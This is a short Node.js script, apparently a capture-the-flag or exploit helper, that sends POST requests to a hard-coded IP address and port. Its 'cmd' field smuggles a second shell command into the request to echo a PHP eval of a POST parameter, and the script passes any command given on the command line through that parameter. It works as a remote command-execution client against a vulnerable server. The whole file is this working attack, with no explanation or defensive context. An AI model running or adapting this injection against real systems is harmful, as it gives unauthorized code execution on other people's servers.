const got = require('got')

const HOST = 'http://120.55.43.255:22712'

const execute = async (command) => {
  let response = await got.post(`${HOST}/`, {
    form: {
      cmd: `cut || echo "eval(\\$_POST[e]);"`,
      e: command,
    },
  })
  return response.body
}

;(async () => {
  const command = process.argv.slice(2)[0]
  console.log(await execute(command))
})()
